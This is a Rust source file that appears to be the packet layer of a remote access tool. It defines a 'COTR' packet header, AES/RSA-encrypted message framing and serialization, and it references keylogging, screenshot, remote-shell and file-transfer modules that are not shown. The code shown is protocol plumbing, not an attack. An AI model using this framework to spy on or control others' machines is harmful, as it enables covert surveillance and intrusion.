pub mod aes;
pub mod filetransfer;
pub mod keylog;
pub mod listdir;
pub mod message;
pub mod rsa;
pub mod screenshot;
pub mod shell;

use crate::network::crypt;
use serde::{Deserialize, Serialize};
use std::any::Any;
use std::fmt::Debug;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use crate::network::crypt::KeyChain;

#[derive(Debug, Copy, Clone, Serialize, Deserialize)]
pub enum PacketEncryption {
    Plain,
    AES,
    RSA,
}

#[derive(Debug, Copy, Clone)]
pub struct PacketHeader {
    pub size: u32,
    pub magic: [u8; 4],
    pub version: u8,
    pub encryption: PacketEncryption,
}

impl PacketHeader {
    pub fn new(size: u32, encryption: PacketEncryption) -> Self {
        Self {
            size,
            magic: [0x43, 0x4F, 0x54, 0x52], // "COTR"
            version: 1,
            encryption,
        }
    }
    pub fn to_vec(&self) -> Result<Vec<u8>, String> {
        let mut buffer = Vec::with_capacity(PACKET_HEADER_SIZE);
        buffer.extend_from_slice(&self.size.to_le_bytes());
        buffer.extend_from_slice(&self.magic);
        buffer.push(self.version);
        buffer.push(self.encryption as u8);
        Ok(buffer)
    }
    pub fn from_vec(data: &[u8]) -> Result<PacketHeader, String> {
        if data.len() != PACKET_HEADER_SIZE {
            return Err("Data too short for PacketHeader".to_string());
        }
        let size = u32::from_le_bytes(data[0..4].try_into().unwrap());
        let magic = data[4..8].try_into().unwrap();
        let version = data[8];
        let encryption = match data[9] {
            0 => PacketEncryption::Plain,
            1 => PacketEncryption::AES,
            2 => PacketEncryption::RSA,
            _ => return Err("Unknown encryption type".to_string()),
        };
        Ok(PacketHeader {
            size,
            magic,
            version,
            encryption,
        })
    }
}

static PACKET_HEADER_SIZE: usize = 10;

#[derive(Debug, Clone)]
pub struct NetworkPacket {
    pub header: PacketHeader,
    pub data: Vec<u8>,
}

impl NetworkPacket {
    pub async fn from_stream<R: AsyncReadExt + Unpin>(
        stream: &mut R,
    ) -> Result<NetworkPacket, String> {
        let mut header_bytes = vec![0u8; PACKET_HEADER_SIZE];
        stream
            .read_exact(&mut header_bytes)
            .await
            .map_err(|_| "Failed to read packet header".to_string())?;
        let header = PacketHeader::from_vec(&header_bytes)?;
        let mut data_bytes = vec![0u8; header.size as usize];
        stream
            .read_exact(&mut data_bytes)
            .await
            .map_err(|err| format!("Failed to read packet data: {}", err))?;
        Ok(NetworkPacket {
            header,
            data: data_bytes,
        })
    }
    pub async fn send<W: AsyncWriteExt + Unpin>(&self, stream: &mut W) -> Result<(), String> {
        let mut send_buffer = Vec::with_capacity(PACKET_HEADER_SIZE + self.data.len());
        let header_bytes = self
            .header
            .to_vec()
            .map_err(|_| "Failed to serialize packet header".to_string())?;
        send_buffer.extend_from_slice(&header_bytes);
        send_buffer.extend_from_slice(&self.data);
        stream
            .write_all(&send_buffer)
            .await
            .map_err(|_| "Failed to send packet".to_string())?;
        Ok(())
    }

    pub fn new_plain(&self, packet_data: &PacketData) -> Result<NetworkPacket, String> {
        packet_data.plain_encode()
            .map_err(|_| "Failed to encrypt packet with plain encoding".to_string())
    }

    pub fn new_aes(&self, packet_data: &PacketData, key_chain: &KeyChain) -> Result<NetworkPacket, String> {
        packet_data.aes_encode(key_chain.aes_key.as_ref().ok_or("AES key not found in key chain")?)
            .map_err(|_| "Failed to encrypt packet with AES".to_string())
    }

    pub fn new_rsa(&self, packet_data: &PacketData, key_chain: &KeyChain) -> Result<NetworkPacket, String> {
        packet_data.rsa_encode(key_chain.rsa_public_key.as_ref().ok_or("RSA public key not found in key chain")?)
            .map_err(|_| "Failed to encrypt packet with RSA".to_string())
    }

    pub fn decrypt(&self, key_chain: KeyChain) -> Result<PacketData, String> {
        let packet = match self.header.encryption {
            PacketEncryption::Plain => PacketData::bin_deserialize(&self.data).unwrap(),
            PacketEncryption::AES => {
                match key_chain.aes_key {
                    Some(aes_key) => PacketData::aes_decode(&self.data, &aes_key)?,
                    None => {
                        return Err("AES key not found in key chain".to_string());
                    }
                }
            },
            PacketEncryption::RSA => {
                match key_chain.rsa_private_key {
                    Some(rsa_private_key) => PacketData::rsa_decode(&self.data, &rsa_private_key)?,
                    None => {
                        return Err("RSA private key not found in key chain".to_string());
                    }
            }
        }
    };
    Ok(packet)
}
}

#[typetag::serde(tag = "type")]
pub trait AnyPacketData: Any + Send + Sync + Debug {
    fn as_any(&self) -> &dyn Any;
}
#[derive(Debug, Serialize, Deserialize)]
pub struct PacketData {
    pub inner: Box<dyn AnyPacketData>,
}

impl From<Box<dyn AnyPacketData>> for PacketData {
    fn from(value: Box<dyn AnyPacketData>) -> Self {
        PacketData { inner: value }
    }
}

impl From<PacketData> for Box<dyn AnyPacketData> {
    fn from(packet_data: PacketData) -> Self {
        packet_data.inner
    }
}

impl PacketData {
    pub fn bin_serialize(&self) -> Result<Vec<u8>, String> {
        rmp_serde::to_vec(self).map_err(|_| "Failed to serialize packet data".to_string())
    }

    pub fn plain_encode(&self) -> Result<NetworkPacket, String> {
        let data = self.bin_serialize()?;
        let header = PacketHeader::new(data.len() as u32, PacketEncryption::Plain);
        Ok(NetworkPacket { header, data })
    }

    pub fn aes_encode(&self, aeskey: &crypt::aes::AESKey) -> Result<NetworkPacket, &'static str> {
        let encoded_data = self
            .bin_serialize()
            .map_err(|_| "Failed to encode packet")?;
        let encrypted_data = aeskey
            .encrypt(&encoded_data)
            .map_err(|_| "Encryption failed")?;
        let header = PacketHeader::new(encrypted_data.len() as u32, PacketEncryption::AES);
        Ok(NetworkPacket {
            header,
            data: encrypted_data,
        })
    }

    pub fn rsa_encode(&self, rsakey: &crypt::rsa::RSAPublicKey) -> Result<NetworkPacket, String> {
        let encoded_data = self
            .bin_serialize()
            .map_err(|_| "Failed to encode packet")?;
        let encrypted_data = rsakey
            .encrypt(&encoded_data)
            .map_err(|_| "Encryption failed")?;
        let header = PacketHeader::new(encrypted_data.len() as u32, PacketEncryption::RSA);
        Ok(NetworkPacket {
            header,
            data: encrypted_data,
        })
    }

    pub fn bin_deserialize(data: &[u8]) -> Result<Self, String> {
        rmp_serde::from_slice(data).map_err(|_| "Failed to deserialize packet data".to_string())
    }

    pub fn aes_decode(
        data: &[u8],
        aes_key: &crypt::aes::AESKey,
    ) -> Result<Self, String> {
        let decoded_data = aes_key
            .decrypt(data)
            .map_err(|_| "Decryption failed")?;
        Self::bin_deserialize(&decoded_data)
    }

    pub fn rsa_decode(
        data: &[u8],
        private_key: &crypt::rsa::RSAPrivateKey,
    ) -> Result<Self, String> {
        let decoded_data = private_key
            .decrypt(&data)
            .map_err(|_| "Decryption failed")?;
        Self::bin_deserialize(&decoded_data)
    }
}
